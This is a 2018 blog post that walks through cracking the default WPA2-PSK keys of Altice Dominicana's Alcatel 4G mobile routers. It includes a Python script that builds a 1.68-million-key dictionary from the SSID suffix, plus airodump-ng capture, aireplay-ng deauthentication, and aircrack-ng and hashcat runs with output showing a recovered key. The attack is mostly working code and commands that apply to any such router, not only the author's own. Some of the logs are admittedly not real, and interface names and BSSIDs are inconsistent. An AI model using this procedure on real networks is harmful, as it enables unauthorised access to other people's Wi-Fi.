---
layout: post
title:  "Cracking Weak WPA/WPA2 Wifi Access Points - The Altice Dominicana case"
date:   2018-09-29 23:30:00 -0400
categories:
  - Tools
tags:
  - linux
  - cracking
  - projects
---

I must start saying: this **isn't a sophisticated** technique, this is just a simple use of **common sense**. I don't have Data plan on my mobile phone service, instead I have a portable WiFi router so I can do cool shit like share my internet connection to several devices using an [Anonabox](https://www.anonabox.com/). In order to acquire a SIM for this we must buy the mobile router to the ISP and I noticed somehting interesting: the WPA2-PSK is really easy to guess.

### What is WPA2-PSK? ###

Short for **W**i-Fi **P**rotected **A**ccess **2** - **P**re-**S**hared **K**ey, and also called WPA or WPA2 Personal,  it is a method of securing your network using WPA2 with the use of the optional Pre-Shared Key (PSK) authentication, which was designed for home users without an enterprise authentication server.

To encrypt a network with WPA2-PSK you provide your router not with an encryption key, but rather with a **plain-English passphrase between 8 and 63 characters long**. Using a technology called **TKIP** (for Temporal Key Integrity Protocol), that passphrase, along with the network SSID, is used to generate unique encryption keys for each wireless client. And those encryption keys are constantly changed. Although WEP also supports passphrases, it does so only as a way to more easily create static keys, which are usually comprised of the hex characters **0-9 and A-F**.

### An explicit SSID and a weak Password ###

I recently renew my contract with the ISP, in this case: Altice Dominicana. They give me a new **Alcatel 4G Wireless Router** and again, they ship the router with the same old pattern again and again. The service is **really good**, kudos for Altice, that's why I keep choosing them, but since I don't trust my privacy to anyone, I'm always looking for weak vectors to protect myself.

The default setting is simple:

**SSID**: Internet Movil Orange_*SUFFIX*

**KEY**: ZZZZ*SUFFIX*

Where `SUFFIX` is a 4 characters long alphanumeric string shared between the SSID and the Key; and `ZZZZ` is another 4 characters long  alphanumeric string that completes a **8 characters long alphanumeric string**. The default key contains only capitalize letters and vocals and numbers between 0 to 9, so our base is: *ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789* (36 possible chars). Now, because we already know the last 4 characters (`SUFFIX`) we're ending up with *1,679,616 [36x36x36x36]* possible outcomes. To generate the dictionary we're going to use next code:

```python
#!/usr/bin/env python

"""Generate a dictionary for mobile WiFi router of Altice Dominicana

We're going to create a file with all possible outcomes based on the
suffix present in the SSID.
"""

import argparse
import itertools
import random


def main(suffix, filename):
    base = 'QAZWSXEDCRFVTGBYHNUJMIKOLP0129834756'
    product = itertools.product(base, repeat=4)
    keys = []
    for product in product:
        keys.append('{}{}'.format(''.join(product), suffix))

    random.shuffle(keys)

    with open(filename, 'w') as f:
        for key in keys:
            f.write("%s\n" % key)

if __name__== "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("suffix", help="Final 4 chars of the SSID.")
    parser.add_argument("file", help="Dictionary filename.")
    args = parser.parse_args()
    main(args.suffix, args.file)
```

Enough for the theory...

### Let's have some fun ###

First, let’s make sure we properly identify our attached network devices. Assuming you didn’t get any errors, the response of said command should give results that look something like this:

```
$ sudo airmon-ng

PHY     Interface   Driver      Chipset

phy0	wlan0       brcmfmac	Broadcom 43430
phy1	wlan1       rt2800usb	Ralink Technology, Corp. RT5370

```

Good, now we need to start the monitor mode to catch our SSID:

```
$ sudo airodump-ng wlan1mon

BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

54:A0:50:DA:7B:98  -76        1        0    0   1  54e  WPA2 CCMP   PSK  RTINC-24
FC:15:B4:CF:0A:55  -70        2        0    0   6  54e. WPA2 CCMP   PSK  HP-Print-55-ENVY 4500 series
A8:4E:3F:73:DD:88  -67        3        0    0   6  54e. WPA2 CCMP   PSK  Internet Movil Orange_2DED
4C:8B:30:83:ED:91  -71        2        0    0   1  54e  WPA2 CCMP   PSK  TELL-US-2.4G

```
*CTRL+C*

*Note: At the moment I'm writing this, my Pi crashed so I can't have the real logs. Sorry.*

`Internet Movil Orange_2DED` is our AP, so we need the **BSSID**: A8:4E:3F:73:DD:88. Let's see if we can deauthenticate somebody:

```
$ sudo airodump-ng --bssid A8:4E:3F:73:DD:88 --channel 6 --write data wlan1mon

BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

A8:4E:3F:73:DD:88  -67        3        0    0   6  54e. WPA2 CCMP   PSK  Internet Movil Orange_2DED

BSSID              STATION            POWER    Rate    Lost    Frames    Probe
A8:4E:3F:73:DD:88  00:08:22:B9:41:A1     -1    1-e 0      0       450
```

Without stoping this, let's try to get `00:08:22:B9:41:A1` deauthenticated:

```
$ sudo aireplay-ng -0 5 -a A8:4E:3F:73:DD:88 -c 00:08:22:B9:41:A1 wlan0mon
12:41:56  Waiting for beacon frame (BSSID: A8:4E:3F:73:DD:88) on channel 6
12:41:57  Sending 64 directed DeAuth. STMAC: [00:08:22:B9:41:A1] [ 0| 0 ACKs]
12:41:58  Sending 64 directed DeAuth. STMAC: [00:08:22:B9:41:A1] [ 0| 0 ACKs]
12:41:58  Sending 64 directed DeAuth. STMAC: [00:08:22:B9:41:A1] [ 0| 0 ACKs]
12:41:59  Sending 64 directed DeAuth. STMAC: [00:08:22:B9:41:A1] [ 0| 0 ACKs]
12:42:00  Sending 64 directed DeAuth. STMAC: [00:08:22:B9:41:A1] [ 0| 0 ACKs]
```

If everything works the client will be eauthenticated and we're going to have our `Probe`:

```
BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

A8:4E:3F:73:DD:88  -67        3        0    0   6  54e. WPA2 CCMP   PSK  Internet Movil Orange_2DED

BSSID              STATION            POWER    Rate    Lost    Frames    Probe
A8:4E:3F:73:DD:88  00:08:22:B9:41:A1     -1    1-e 0      0       450    Internet Movil Orange_2DED
```

Now we can stop that, generate our dictionary and crack they key.

### Crack! Baby! Crack! ###

My Rasbperry Pi crashed trying to upload the .cap (*data-01.cap*) file, so I had to copy the file from the SDCARD directly. It is not recommended to run a dictionary attack using the Pi anyways, so...

Let's generate the dictionary:

```
$ python generate_altice_dictionary.py 2DED passwords.txt
$ wc -l passwords.txt
1679616 passwords.txt
```

Cool, let's try with *aircrack-ng*:

```
$ aircrack-ng data-01.cap -w passwords.txt

[00:11:03] 1420180/1679610 keys tested (2813.99 k/s)

      Time left: 1 minute, 32 seconds                           84.55%

                           KEY FOUND! [ CF832DED ]


      Master Key     : 11 C6 60 D4 1F 20 99 A9 C7 71 F7 3C 96 8C D3 5C
                       4A 50 25 27 3B 16 C8 A2 98 95 1B 9D 4E 44 D5 65

      Transient Key  : 4B 18 E2 ED 5A 18 6C 4E 56 BA 72 83 C0 EE D7 DA
                       34 E2 49 05 8D 27 11 77 50 71 B6 F9 1B F8 BD CB
                       86 9C ED D3 05 AA DF 83 90 DF EC D4 94 76 6D 60
                       E2 F9 62 BD 9B 78 3E 30 49 A5 B8 6D 29 54 BA 00

      EAPOL HMAC     : BD 03 DA 13 18 85 F8 13 12 F5 5D 07 B8 A7 E3 86
```

Bingo! `CF832DED` is the KEY! It took almost 15 minutes to crack it, but it did it.

#### Bonus: Let's try with hashcat ####

We already found the key, but let's try with **hashcat**. Our first step is to convert the .cap file to .*hccapx*, so we'll need **hashcat-utils**:

```
$ git clone https://github.com/hashcat/hashcat-utils.git
Cloning into 'hashcat-utils'...
remote: Enumerating objects: 3, done.
remote: Counting objects: 100% (3/3), done.
remote: Compressing objects: 100% (3/3), done.
remote: Total 416 (delta 0), reused 1 (delta 0), pack-reused 413
Receiving objects: 100% (416/416), 126.03 KiB | 837.00 KiB/s, done.
Resolving deltas: 100% (262/262), done.

$ cd hashcat-utils/src
$ make
rm -f ../bin/*
rm -f *.bin *.exe
cc -Wall -W -pipe -O2 -std=gnu99  -o cap2hccapx.bin cap2hccapx.c
...
```

Good... let's convert our file:

```
$ cap2hccapx.bin data-01.cap output.hccapx
Networks detected: 1

[*] BSSID=9c:4f:cf:83:2d:ed ESSID=Internet Movil Orange_2DED (Length: 26)
 --> STA=c0:ee:fb:33:a9:e0, Message Pair=0, Replay Counter=0
 --> STA=c0:ee:fb:33:a9:e0, Message Pair=2, Replay Counter=0

Written 2 WPA Handshakes to: output.hccapx
```

Excellent, now we're ready:

```
$ hashcat -m 2500 output.hccapx passwords.txt
hashcat (v4.1.0-90-geb563f5a) starting...

OpenCL Platform #1: Apple
=========================
* Device #1: Intel(R) Core(TM) i7-3520M CPU @ 2.90GHz, skipped.
* Device #2: HD Graphics 4000, 384/1536 MB allocatable, 16MCU

Hashes: 2 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Single-Hash
* Single-Salt
* Slow-Hash-SIMD-LOOP

Minimum password length supported by kernel: 8
Maximum password length supported by kernel: 63

Watchdog: Temperature abort trigger disabled.

Dictionary cache built:
* Filename..: passwords.txt
* Passwords.: 1679616
* Bytes.....: 15116544
* Keyspace..: 1679616
* Runtime...: 0 secs

[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit =>

f8c03f93dd1affe7727f5e4c78a4d9b1:9c4fcf832ded:c0eefb33a9e0:Internet Movil Orange_2DED:CF832DED

Session..........: hashcat
Status...........: Cracked
Hash.Type........: WPA/WPA2
Hash.Target......: Internet Movil Orange_2DED (AP:9c:4f:cf:83:2d:ed STA:c0:ee:fb:33:a9:e0)
Time.Started.....: Sat Sep 29 20:04:06 2018 (7 mins, 42 secs)
Time.Estimated...: Sat Sep 29 20:11:48 2018 (0 secs)
Guess.Base.......: File (passwords.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.Dev.#2.....:     3122 H/s (9.08ms) @ Accel:8 Loops:2 Thr:512 Vec:1
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 1441792/1679616 (85.84%)
Rejected.........: 0/1441792 (0.00%)
Restore.Point....: 1376256/1679616 (81.94%)
Candidates.#2....: XTTB2DED -> ISI52DED

Started: Sat Sep 29 20:03:40 2018
Stopped: Sat Sep 29 20:11:49 2018
```

Eureka! the key was found fastest: `Internet Movil Orange_2DED:CF832DED`.

### Conclusion ###

This wasn't rocket science and it should be valid for others ISPs around the world. I think at first glance this shouldn't be a problem for Altice, but I've seen this mobile routers being used for little business and that's scary. Maybe Altice's engineers and managers didn't anticipate the success of the service and overlooked this flaw in order to provide an easy to use WiFi service.

Also *hashcat* is faster! :)